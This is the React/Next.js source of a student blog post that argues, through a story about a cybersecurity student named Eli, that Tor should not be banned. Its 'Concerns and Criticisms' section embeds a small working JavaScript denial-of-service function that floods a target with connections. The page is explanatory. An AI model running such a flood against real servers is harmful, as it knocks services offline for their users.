"use client";

import Navbar from "../../components/Navbar";
import Head from "next/head";
import Image from "next/image";
import { useEffect, useState, memo } from "react";

import "prismjs";
import "prismjs/themes/prism-okaidia.css";
import "prismjs/components/prism-bash";
import "prismjs/components/prism-javascript";
import "prismjs/components/prism-python";

function ZoomableImage({
  src,
  alt,
  className,
  width = 500,
  height = 500,
  zoomWidth = 800,
  zoomHeight = 800,
}) {
  const [isZoomed, setIsZoomed] = useState(false);
  const [imageError, setImageError] = useState(false);

  const handleClick = () => setIsZoomed(true);
  const handleClose = () => setIsZoomed(false);

  useEffect(() => {
    const handleKeyDown = (e) => {
      if (e.key === "Escape") handleClose();
    };
    window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  }, []);

  useEffect(() => {
    Prism.highlightAll(); // Ensure Prism.js highlights after render
  }, []);

  return (
    <>
      <Image
        src={imageError ? "/images/placeholder.jpg" : src}
        alt={alt}
        className={`${className} cursor-pointer transition-transform duration-300 hover:scale-105`}
        onClick={handleClick}
        onError={() => setImageError(true)}
        width={width}
        height={height}
      />
      {isZoomed && (
        <div
          onClick={handleClose}
          className="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50"
        >
          <Image
            src={imageError ? "/images/placeholder.jpg" : src}
            alt={alt}
            className="max-w-full max-h-full transform transition-transform duration-300"
            onError={() => setImageError(true)}
            width={zoomWidth}
            height={zoomHeight}
          />
        </div>
      )}
    </>
  );
}

function ReadingProgressBar() {
  const [progress, setProgress] = useState(0);

  useEffect(() => {
    const handleScroll = () => {
      const scrollTotal =
        document.documentElement.scrollHeight -
        document.documentElement.clientHeight;
      const currentScroll = window.scrollY;
      const scrollProgress = (currentScroll / scrollTotal) * 100;
      setProgress(scrollProgress);
    };

    window.addEventListener("scroll", handleScroll);
    return () => window.removeEventListener("scroll", handleScroll);
  }, []);

  return (
    <div className="fixed top-0 left-0 w-full h-1 bg-gray-300 dark:bg-gray-600 z-50">
      <div className="h-1 bg-blue-500" style={{ width: `${progress}%` }}></div>
    </div>
  );
}

const FloatingBackToTop = memo(function FloatingBackToTop() {
  const [visible, setVisible] = useState(false);

  useEffect(() => {
    const handleScroll = () => {
      setVisible(window.scrollY > 300);
    };
    window.addEventListener("scroll", handleScroll);
    return () => window.removeEventListener("scroll", handleScroll);
  }, []);

  const scrollToTop = () => window.scrollTo({ top: 0, behavior: "smooth" });

  return (
    visible && (
      <button
        onClick={scrollToTop}
        className="fixed bottom-8 right-8 bg-blue-600 hover:bg-blue-700 text-white p-4 rounded-full shadow-lg focus:outline-none transition duration-300 z-50"
        aria-label="Back to Top"
      >
        <svg
          xmlns="http://www.w3.org/2000/svg"
          className="h-6 w-6"
          fill="none"
          viewBox="0 0 24 24"
          stroke="currentColor"
        >
          <path
            strokeLinecap="round"
            strokeLinejoin="round"
            strokeWidth="2"
            d="M5 10l7-7m0 0l7 7m-7-7v18"
          />
        </svg>
      </button>
    )
  );
});

function DarkModeToggle({ isDarkMode, toggleDarkMode }) {
  return (
    <button
      onClick={toggleDarkMode}
      className="fixed bottom-8 left-8 bg-blue-600 hover:bg-blue-700 text-white p-4 rounded-full shadow-lg focus:outline-none transition duration-300 z-50"
      aria-label="Toggle Dark Mode"
    >
      {isDarkMode ? "☀️" : "🌙"}
    </button>
  );
}

const scrollToSection = (id) => {
  const element = document.getElementById(id);
  if (element) {
    element.scrollIntoView({ behavior: "smooth" });
  }
};

export default function Tor() {
  const [isDarkMode, setIsDarkMode] = useState(false);
  const [activeSection, setActiveSection] = useState("");

  const toggleDarkMode = () => setIsDarkMode((prev) => !prev);

  useEffect(() => {
    const sectionIds = [
      "introduction",
      "what-is-tor",
      "benefits-of-tor",
      "concerns-and-criticisms",
      "balancing-freedom-and-responsibility",
      "conclusion",
    ];
    const observer = new IntersectionObserver(
      (entries) => {
        entries.forEach((entry) => {
          if (entry.isIntersecting) {
            setActiveSection(entry.target.id);
          }
        });
      },
      { threshold: 0.3 }
    );

    sectionIds.forEach((id) => {
      const element = document.getElementById(id);
      if (element) observer.observe(element);
    });

    return () => {
      sectionIds.forEach((id) => {
        const element = document.getElementById(id);
        if (element) observer.unobserve(element);
      });
    };
  }, []);

  return (
    <>
      <Head>
        <title>The Dual Edge of Digital Anonymity: A Commentary on Tor</title>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <meta
          name="description"
          content="An ethical exploration of the Tor network, examining both its vital role in protecting privacy and the challenges it presents in combating illegal activities."
        />
      </Head>

      <ReadingProgressBar />
      <DarkModeToggle isDarkMode={isDarkMode} toggleDarkMode={toggleDarkMode} />
      <Navbar isDarkMode={isDarkMode} />

      <div
        className={
          isDarkMode ? "bg-gray-900 text-gray-200" : "bg-gray-100 text-gray-800"
        }
      >
        <main id="top" className="min-h-screen py-7 px-4 pt-0">
          <div className="max-w-7xl mx-auto grid grid-cols-1 md:grid-cols-12 ml-5">
            {/* Table of Contents */}
            <aside className="md:col-span-3 hidden md:block">
              <div className="sticky space-y-6" style={{ top: "20px" }}>
                <div>
                  <h2 className="text-2xl font-semibold mb-4 hover:text-blue-500 transition-colors duration-300">
                    Table of Contents
                  </h2>
                  <ul className="list space-y-2">
                    <li>
                      <a
                        href="#introduction"
                        onClick={(e) => {
                          e.preventDefault();
                          scrollToSection("introduction");
                        }}
                        className={`transition-colors duration-200 hover:text-blue-600 ${
                          activeSection === "introduction"
                            ? "text-blue-600 font-bold"
                            : ""
                        }`}
                      >
                        Introduction
                      </a>
                    </li>
                    <li>
                      <a
                        href="#what-is-tor"
                        onClick={(e) => {
                          e.preventDefault();
                          scrollToSection("what-is-tor");
                        }}
                        className={`transition-colors duration-200 hover:text-blue-600 ${
                          activeSection === "what-is-tor"
                            ? "text-blue-600 font-bold"
                            : ""
                        }`}
                      >
                        What is Tor?
                      </a>
                    </li>
                    <li>
                      <a
                        href="#benefits-of-tor"
                        onClick={(e) => {
                          e.preventDefault();
                          scrollToSection("benefits-of-tor");
                        }}
                        className={`transition-colors duration-200 hover:text-blue-600 ${
                          activeSection === "benefits-of-tor"
                            ? "text-blue-600 font-bold"
                            : ""
                        }`}
                      >
                        Benefits of Tor
                      </a>
                    </li>
                    <li>
                      <a
                        href="#concerns-and-criticisms"
                        onClick={(e) => {
                          e.preventDefault();
                          scrollToSection("concerns-and-criticisms");
                        }}
                        className={`transition-colors duration-200 hover:text-blue-600 ${
                          activeSection === "concerns-and-criticisms"
                            ? "text-blue-600 font-bold"
                            : ""
                        }`}
                      >
                        Concerns and Criticisms
                      </a>
                    </li>
                    <li>
                        <a
                        href="#balancing-freedom-and-responsibility"
                        onClick={(e) => {
                          e.preventDefault();
                          scrollToSection("balancing-freedom-and-responsibility");
                        }}
                        className={`transition-colors duration-200 hover:text-blue-600 ${
                          activeSection === "balancing-freedom-and-responsibility"
                            ? "text-blue-600 font-bold"
                            : ""
                        }`}
                      >
                        Balancing Freedom and Responsibility
                      </a>
                    </li>
                    <li>
                        <a
                        href="#conclusion"
                        onClick={(e) => {
                          e.preventDefault();
                          scrollToSection("conclusion");
                        }}
                        className={`transition-colors duration-200 hover:text-blue-600 ${
                          activeSection === "conclusion"
                            ? "text-blue-600 font-bold"
                            : ""
                        }`}
                      >
                        Conclusion
                      </a>
                    </li>
                  </ul>
                </div>
              </div>
            </aside>

            {/* Main Content */}
            <article className="md:col-span-7 ml-11">
              <h1 className="text-6xl font-bold mb-3 hover:scale-105 transform transition duration-300 mr-6">
                The Dual Edge of Digital Anonymity: A Commentary on Tor
              </h1>

              <div className="text-justify mb-8">
                <p className="text-sm text-gray-500">May 19, 2025</p>
              </div>

              <section
                id="introduction"
                aria-labelledby="introduction-heading"
                className="mb-10"
              >
                <h2
                  id="introduction-heading"
                  className="text-3xl font-semibold mb-4 hover:text-blue-500 transition-colors duration-300"
                >
                  Introduction
                </h2>
                <p className="mb-4">
                  The last rays of sunlight filtered through the blinds as Eli Tan 
                  stared at his final assignment for the semester. The instructions 
                  loomed on his screen: <em>"Write a short commentary on the Tor 
                  project and discuss the ethical implications for its existence. 
                  Should Tor be banned? Is it a force of evil? Or good?"</em>
                </p>
                <p className="mb-4">
                  Eli sighed, stretching his arms above his head. After a 
                  semester of diving deep into cybersecurity challenges 
                  and buffer overflows, this final assignment demanded something 
                  different—not technical prowess, but ethical reflection.
                </p>
                <p className="mb-4">
                  <q><em>The dark web,</em></q> he murmured, tapping his pen against his desk. 
                  Most of his classmates saw it as a shadowy realm of illicit activity. 
                  But was that the whole story? As a cybersecurity student, Eli knew 
                  that technology itself was rarely inherently good or evil—it was 
                  how people used it that mattered.
                </p>
                <p className="mb-4">
                  Curiosity piqued, he decided to approach this assignment not just 
                  as an academic exercise, but as a journey of exploration. Opening 
                  a fresh document, he began to type, determined to unravel the 
                  complex ethical tapestry surrounding the Tor network.
                </p>
              </section>

              <hr className="my-8 border-t border-gray-300 dark:border-gray-600" />

              <section
                id="what-is-tor"
                aria-labelledby="what-is-tor-heading"
                className="mb-10"
              >
                <h2
                  id="what-is-tor-heading"
                  className="text-3xl font-semibold mb-4 hover:text-blue-500 transition-colors duration-300"
                >
                  What is Tor?
                </h2>
                
                <div className="mb-6">
                  <div className={`w-full h-64 flex items-center justify-center rounded-lg overflow-hidden ${isDarkMode ? 'bg-gray-700' : 'bg-gray-200'}`}>
                    <ZoomableImage
                      src="/images/tor-network.png"
                      alt="Tor network architecture showing onion routing"
                      className="w-full h-full object-contain"
                    />
                  </div>
                  <p className="text-center text-sm text-gray-500 mt-2 hover:text-blue-500 transition-colors duration-300">
                    The Tor network's onion routing architecture with multiple layers of encryption.
                  </p>
                </div>
                
                <p className="mb-4">
                  Before diving into the ethical debate, Eli realized he needed to first understand 
                  what Tor actually was. He began researching its origin and technical architecture.
                </p>
                <p className="mb-4">
                  Tor, an acronym for "The Onion Router," was originally developed by the U.S. Naval 
                  Research Laboratory in the mid-1990s. Its primary purpose was to protect U.S. 
                  intelligence communications online. In 2006, the Tor Project became a non-profit 
                  organization, dedicated to the research and development of online privacy tools.
                </p>
                <p className="mb-4">
                  <q><em>The name "onion routing" makes perfect sense,</em></q> Eli thought as he sketched 
                  the network on a notepad. The system worked by encrypting data in multiple layers 
                  (like an onion) and sending it through a series of nodes, each one peeling away 
                  only a single layer of encryption. This meant no single relay in the network knew 
                  both the origin and destination of the data.
                </p>
                <p className="mb-4">
                  The Tor Browser, built on a modified Firefox browser, allowed anyone to access 
                  this network with relative ease. Through it, users could access both regular 
                  websites and special ".onion" sites that existed only within the Tor network—collectively 
                  known as the "dark web."
                </p>
                <pre>
                  <code className="language-bash">
                    {`# Basic command to install Tor Browser on Ubuntu
sudo add-apt-repository ppa:micahflee/ppa
sudo apt update
sudo apt install torbrowser-launcher
torbrowser-launcher`}
                  </code>
                </pre>
                <p className="mt-4">
                  <q><em>It's actually quite remarkable engineering,</em></q> Eli muttered, impressed by the 
                  technical elegance of the solution. But he knew that the real question wasn't about 
                  Tor's technical merits—it was about its impact on society.
                </p>
              </section>

              <hr className="my-8 border-t border-gray-300 dark:border-gray-600" />

              <section
                id="benefits-of-tor"
                aria-labelledby="benefits-of-tor-heading"
                className="mb-10"
              >
                <h2
                  id="benefits-of-tor-heading"
                  className="text-3xl font-semibold mb-4 hover:text-blue-500 transition-colors duration-300"
                >
                  Benefits of Tor
                </h2>
                
                <div className="mb-6">
                  <div className={`w-full h-64 flex items-center justify-center rounded-lg overflow-hidden ${isDarkMode ? 'bg-gray-700' : 'bg-gray-200'}`}>
                    <ZoomableImage
                      src="/images/press-freedom.jpg"
                        alt="Laura Poitras quote about Tor's importance for journalism"
                        className="w-full h-full object-contain"
                    />
                  </div>
                  <p className="text-center text-sm text-gray-500 mt-2 hover:text-blue-500 transition-colors duration-300">
                     Laura Poitras, Oscar-winning filmmaker of CITIZENFOUR, on the critical importance of Tor for journalistic freedom.
                  </p>
                </div>
                
                <p className="mb-4">
                  As Eli delved deeper into his research, he found numerous examples of how 
                  Tor had become an invaluable tool for many legitimate users:
                </p>
                
                <h3 className="text-xl font-semibold mb-2 hover:text-blue-500 transition-colors duration-300">
                  Protecting Vulnerable Communications
                </h3>
                <p className="mb-4">
                  In countries with restrictive regimes, journalists, activists, and ordinary 
                  citizens used Tor to bypass censorship and communicate safely. Organizations 
                  like Reporters Without Borders actively recommended Tor to journalists 
                  working in dangerous regions.
                </p>
                <p className="mb-4">
                  <q><em>That's powerful,</em></q> Eli thought, reading stories of dissidents who had 
                  evaded persecution thanks to the anonymity Tor provided. <q><em>These people would 
                  literally be in prison—or worse—without this technology.</em></q>
                </p>
                
                <h3 className="text-xl font-semibold mb-2 hover:text-blue-500 transition-colors duration-300">
                  Protection from Surveillance
                </h3>
                <p className="mb-4">
                  Even in democratic nations, Tor offered protection from increasingly 
                  ubiquitous commercial tracking and data collection. Privacy-conscious individuals 
                  used it to prevent companies from building detailed profiles of their online 
                  activities.
                </p>
                <p className="mb-4">
                  Whistleblowers, too, depended on Tor. Edward Snowden famously used 
                  the network when communicating with journalists to reveal widespread 
                  surveillance programs. Without such protections, many government and 
                  corporate wrongdoings might never come to light.
                </p>
                
                <h3 className="text-xl font-semibold mb-2 hover:text-blue-500 transition-colors duration-300">
                  Personal Security
                </h3>
                <p className="mb-4">
                  Tor provided crucial protection for vulnerable groups: domestic violence 
                  survivors hiding from abusers, individuals researching sensitive health 
                  information, or members of marginalized communities seeking support without 
                  exposing themselves to discrimination.
                </p>
                <pre>
                  <code className="language-python">
                    {`# Python example showing how to use the Tor network programmatically
import requests
import socks
import socket

# Configure Tor connection
socks.set_default_proxy(socks.SOCKS5, "localhost", 9050)
socket.socket = socks.socksocket

# Now requests will go through Tor
response = requests.get("https://check.torproject.org/")
print("Connected through Tor" in response.text)`}
                  </code>
                </pre>
                <p className="mt-4">
                  <q><em>The benefits are undeniable,</em></q> Eli noted on his document. <q><em>Tor isn't 
                  just about hiding shady activities—it's often about basic safety and human rights.</em></q>
                </p>
              </section>

              <hr className="my-8 border-t border-gray-300 dark:border-gray-600" />

              <section
                id="concerns-and-criticisms"
                aria-labelledby="concerns-and-criticisms-heading"
                className="mb-10"
              >
                <h2
                  id="concerns-and-criticisms-heading"
                  className="text-3xl font-semibold mb-4 hover:text-blue-500 transition-colors duration-300"
                >
                  Concerns and Criticisms
                </h2>
                
                <div className="mb-6">
                  <div className={`w-full h-64 flex items-center justify-center rounded-lg overflow-hidden ${isDarkMode ? 'bg-gray-700' : 'bg-gray-200'}`}>
                    <ZoomableImage
                      src="/images/dark-web-markets.jpg"
                      alt="Conceptual image representing dark web markets"
                      className="w-full h-full object-contain"
                    />
                  </div>
                  <p className="text-center text-sm text-gray-500 mt-2 hover:text-blue-500 transition-colors duration-300">
                    Illicit marketplaces represent one of the most controversial aspects of the dark web.
                  </p>
                </div>
                
                <p className="mb-4">
                  As Eli continued his exploration, he couldn't ignore the darker aspects of Tor 
                  and the concerns they raised. Ethical analysis required honest confrontation 
                  of both benefits and harms.
                </p>
                
                <h3 className="text-xl font-semibold mb-2 hover:text-blue-500 transition-colors duration-300">
                  Criminal Activities
                </h3>
                <p className="mb-4">
                  The same anonymity that protected legitimate users also shielded those engaged 
                  in illegal activities. Marketplaces for drugs, weapons, and stolen data thrived 
                  within the Tor network. The infamous Silk Road marketplace, before its shutdown 
                  in 2013, facilitated over $1 billion in illegal transactions.
                </p>
                <p className="mb-4">
                  <q><em>It's frustrating,</em></q> Eli thought. <q><em>These criminal uses give the entire 
                  network a bad reputation, even though they represent just a fraction of Tor traffic.</em></q>
                </p>
                
                <h3 className="text-xl font-semibold mb-2 hover:text-blue-500 transition-colors duration-300">
                  Exploitation and Harmful Content
                </h3>
                <p className="mb-4">
                  Perhaps most disturbing were sites dedicated to exploitation, particularly 
                  those involving minors. Law enforcement agencies faced significant challenges 
                  in tracking perpetrators protected by Tor's anonymity features.
                </p>
                <p className="mb-4">
                  Eli grimaced as he read reports about these sites. This was the aspect of Tor 
                  that many pointed to when arguing for its restriction or outright ban.
                </p>
                
                <h3 className="text-xl font-semibold mb-2 hover:text-blue-500 transition-colors duration-300">
                  Enabling State Actors and Terrorists
                </h3>
                <p className="mb-4">
                  Intelligence agencies noted that terrorist organizations and hostile 
                  state actors could use Tor to coordinate activities while evading detection. 
                  This created a genuine security concern that couldn't be dismissed lightly.
                </p>
                <pre>
                  <code className="language-javascript">
                    {`// Example code showing a simple DoS attack that could be hidden using Tor
const net = require('net');

function launchAttack(target, port, duration) {
  const endTime = Date.now() + duration * 1000;
  
  function createConnection() {
    if (Date.now() >= endTime) return;
    
    const socket = net.connect(port, target, () => {
      console.log('Connection established');
      // Keep connection open, consuming resources
      socket.on('error', () => {
        setTimeout(createConnection, 100);
      });
    });
    
    socket.on('error', () => {
      setTimeout(createConnection, 100);
    });
  }
  
  // Create multiple connections
  for (let i = 0; i < 100; i++) {
    createConnection();
  }
}

// This hypothetical attack could be launched while hiding behind Tor
// launchAttack('target-server.com', 80, 60); // Attack for 60 seconds`}
                  </code>
                </pre>
                <p className="mt-4">
                  <q><em>These concerns can't be ignored,</em></q> Eli admitted. <q><em>There's real harm happening 
                  under the cover of anonymity that Tor provides. But does that mean we should 
                  ban the technology entirely?</em></q>
                </p>
              </section>

              <hr className="my-8 border-t border-gray-300 dark:border-gray-600" />

              <section
                id="balancing-freedom-and-responsibility"
                aria-labelledby="balancing-freedom-and-responsibility-heading"
                className="mb-10"
              >
                <h2
                  id="balancing-freedom-and-responsibility-heading"
                  className="text-3xl font-semibold mb-4 hover:text-blue-500 transition-colors duration-300"
                >
                  Balancing Freedom and Responsibility
                </h2>
                
                <div className="mb-6">
                  <div className={`w-full h-64 flex items-center justify-center rounded-lg overflow-hidden ${isDarkMode ? 'bg-gray-700' : 'bg-gray-200'}`}>
                    <ZoomableImage
                      src="/images/digital-liberty.jpg"
                      alt="Conceptual image of digital liberty and security balance"
                      className="w-full h-full object-contain"
                    />
                  </div>
                  <p className="text-center text-sm text-gray-500 mt-2 hover:text-blue-500 transition-colors duration-300">
                    The challenge of balancing digital freedom with security concerns.
                  </p>
                </div>
                
                <p className="mb-4">
                  After weighing both the benefits and concerns, Eli struggled with the core question: 
                  Should Tor be banned? Looking deeper, he realized this binary framing missed important nuances.
                </p>
                
                <h3 className="text-xl font-semibold mb-2 hover:text-blue-500 transition-colors duration-300">
                  The Double-Edged Sword Argument
                </h3>
                <p className="mb-4">
                  <q><em>Tor is like a knife,</em></q> Eli wrote. <q><em>It can be used to prepare food or to harm 
                  someone. But we don't ban knives—we create laws against their misuse and develop 
                  systems to prevent and address harm.</em></q>
                </p>
                <p className="mb-4">
                  Most technologies had dual-use potential, from encryption to social media platforms. 
                  The approach society typically took was to regulate harmful behaviors rather than 
                  banning the technology outright.
                </p>
                
                <h3 className="text-xl font-semibold mb-2 hover:text-blue-500 transition-colors duration-300">
                  Practical Considerations
                </h3>
                <p className="mb-4">
                  Eli also noted the practical challenges of banning Tor. It was an open-source 
                  technology that could be rebuilt even if current implementations were outlawed. 
                  Countries like China that had tried to block Tor had been only partially successful, 
                  as users found ways around restrictions.
                </p>
                <p className="mb-4">
                  Furthermore, banning Tor would disproportionately harm legitimate users who relied 
                  on it for safety and freedom, while sophisticated criminals would likely find 
                  alternative methods.
                </p>
                
                <h3 className="text-xl font-semibold mb-2 hover:text-blue-500 transition-colors duration-300">
                  Alternative Approaches
                </h3>
                <p className="mb-4">
                  Rather than banning Tor, Eli identified several more nuanced approaches:
                </p>
                <ul className="list-disc pl-5 space-y-2 mb-4">
                  <li><strong>Targeted Law Enforcement:</strong> Increasing resources and developing specialized tools for investigating specific criminal activities on Tor, rather than targeting the network itself.</li>
                  <li><strong>Education and Awareness:</strong> Promoting digital literacy and ethical online behavior to help people make informed choices about their actions online.</li>
                  <li><strong>Collaborative Moderation:</strong> Encouraging community-based reporting systems for harmful content, while preserving anonymity for legitimate users.</li>
                  <li><strong>Technical Research:</strong> Supporting research into methods that could identify specific harmful activities without compromising overall network privacy.</li>
                </ul>
                <pre>
                  <code className="language-python">
                    {`# Example of how law enforcement might use timestamps to correlate Tor traffic
# (simplified conceptual example)

def analyze_network_traffic(exit_node_logs, entry_node_logs, target_timestamp):
    """
    Analyze correlation between entry and exit node traffic patterns
    to potentially identify connections.
    """
    exit_connections = find_connections_at_time(exit_node_logs, target_timestamp, window=30)
    entry_connections = find_connections_at_time(entry_node_logs, target_timestamp, window=30)
    
    # Look for statistical correlations in traffic patterns
    correlations = calculate_traffic_correlations(entry_connections, exit_connections)
    
    # This might help identify patterns without breaking Tor's core privacy model
    return correlations`}
                  </code>
                </pre>
                <p className="mt-4">
                  <q><em>It's about finding balance,</em></q> Eli concluded. <q><em>We need to address the real 
                  harms that can occur on Tor without destroying a tool that provides vital 
                  protection for vulnerable people around the world.</em></q>
                </p>
              </section>

              <hr className="my-8 border-t border-gray-300 dark:border-gray-600" />

              <section
                id="conclusion"
                aria-labelledby="conclusion-heading"
                className="mb-10"
              >
                <h2
                  id="conclusion-heading"
                  className="text-3xl font-semibold mb-4 hover:text-blue-500 transition-colors duration-300"
                >
                  Conclusion
                </h2>
                <p className="mb-4">
                  As dawn began to break outside his window, Eli Tan leaned back in his chair and 
                  reviewed what he had written. The ethical questions surrounding Tor had no easy 
                  answers, but he had come to a thoughtful position.
                </p>
                <p className="mb-4">
                  <q><em>Tor should not be banned,</em></q> he typed firmly. <q><em>The legitimate benefits 
                  it provides for human rights, privacy, and security outweigh the harms. Like any 
                  powerful tool, it can be misused, but eliminating it entirely would cause more harm 
                  than good, particularly to those who are most vulnerable.</em></q>
                </p>
                <p className="mb-4">
                  Instead, society needed to develop more sophisticated approaches to mitigating the 
                  harms while preserving the core benefits. This meant investing in targeted law 
                  enforcement capabilities, promoting digital ethics, and continuously refining our 
                  understanding of the balance between freedom and security in the digital realm.
                </p>
                <p className="mb-4">
                  The Tor network represented something larger than just software—it embodied the 
                  fundamental tension between privacy and accountability in the digital age. Finding 
                  the right balance wasn't about choosing one extreme over the other, but about 
                  developing nuanced approaches that respected both values.
                </p>
                <p className="mb-4">
                  <q><em>We can't simply classify Tor as 'good' or 'evil,'</em></q> Eli concluded. 
                  <q><em>It's a reflection of humanity itself—capable of both protecting the vulnerable 
                  and enabling harm. Our challenge is not to destroy such technologies, but to guide 
                  their use toward the betterment of society while minimizing their potential for harm.</em></q>
                </p>
                <p className="mb-4">
                  With a satisfied nod, Eli submitted his assignment just as the first rays of 
                  sunlight spilled across his desk. Perhaps more valuable than the grade he might 
                  receive was the understanding he'd gained: that in cybersecurity as in life, 
                  ethical questions rarely had simple answers—only thoughtful ones.
                </p>
              </section>

              <hr className="my-8 border-t border-gray-300 dark:border-gray-600" />

              <section
                id="about-authors"
                aria-labelledby="about-authors-heading"
                className="mt-12 mb-4"
              >
                <h2
                  id="about-authors-heading"
                  className="text-2xl font-semibold mb-8 text-center hover:text-blue-500 transition-colors duration-300"
                >
                  The Authors
                </h2>
                <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-6">
                  <div
                    className={`flex flex-col items-center p-4 rounded-md ${
                      isDarkMode
                        ? "bg-gray-700 hover:bg-blue-900"
                        : "bg-gray-200 hover:bg-blue-400"
                    } transition-colors duration-300`}
                  >
                    <ZoomableImage
                      src="/images/carl.jpg"
                      alt="Carl Asoy"
                      className="w-24 h-24 rounded-full mb-2"
                    />
                    <p className="text-center text-lg font-medium">
                      Asoy, Carl
                    </p>
                    <p className="text-center text-sm text-gray-500 mt-2">
                      Cybersecurity researcher passionate about network defense.
                    </p>
                  </div>
                  <div
                    className={`flex flex-col items-center p-4 rounded-md ${
                      isDarkMode
                        ? "bg-gray-700 hover:bg-blue-900"
                        : "bg-gray-200 hover:bg-blue-400"
                    } transition-colors duration-300`}
                  >
                    <ZoomableImage
                      src="/images/jade.jpg"
                      alt="Jade Cataques"
                      className="w-24 h-24 rounded-full mb-2"
                    />
                    <p className="text-center text-lg font-medium">
                      Cataques, Jade
                    </p>
                    <p className="text-center text-sm text-gray-500 mt-2">
                      Innovator in cybersecurity solutions and data protection.
                    </p>
                  </div>
                  <div
                    className={`flex flex-col items-center p-4 rounded-md ${
                      isDarkMode
                        ? "bg-gray-700 hover:bg-blue-900"
                        : "bg-gray-200 hover:bg-blue-400"
                    } transition-colors duration-300`}
                  >
                    <ZoomableImage
                      src="/images/daniel.png"
                      alt="Daniel Cruz"
                      className="w-24 h-24 rounded-full mb-2"
                    />
                    <p className="text-center text-lg font-medium">
                      Cruz, Daniel
                    </p>
                    <p className="text-center text-sm text-gray-500 mt-2">
                      Just a chill guy.
                    </p>
                  </div>
                  <div
                    className={`flex flex-col items-center p-4 rounded-md ${
                      isDarkMode
                        ? "bg-gray-700 hover:bg-blue-900"
                        : "bg-gray-200 hover:bg-blue-400"
                    } transition-colors duration-300`}
                  >
                    <ZoomableImage
                      src="/images/liam.jpg"
                      alt="Liam Gillamac"
                      className="w-24 h-24 rounded-full mb-2"
                    />
                    <p className="text-center text-lg font-medium">
                      Gillamac, Liam
                    </p>
                    <p className="text-center text-sm text-gray-500 mt-2">
                      Expert in software security and system resilience.
                    </p>
                  </div>
                </div>
              </section>
            </article>

            <aside className="md:col-span-1 hidden md:block"></aside>
          </div>
        </main>

        <footer
          className={`${
            isDarkMode
              ? "bg-gray-800 text-gray-300"
              : "bg-gray-200 text-gray-700"
          } py-6 px-10 text-center`}
        >
          <p className="text-sm">
            &copy; {new Date().getFullYear()} CyberInsights. All rights
            reserved.
          </p>
          <p className="text-sm mt-2">
            Made with ❤️ by the CyberInsights Team.
          </p>
        </footer>
      </div>

      <FloatingBackToTop />
    </>
  );
}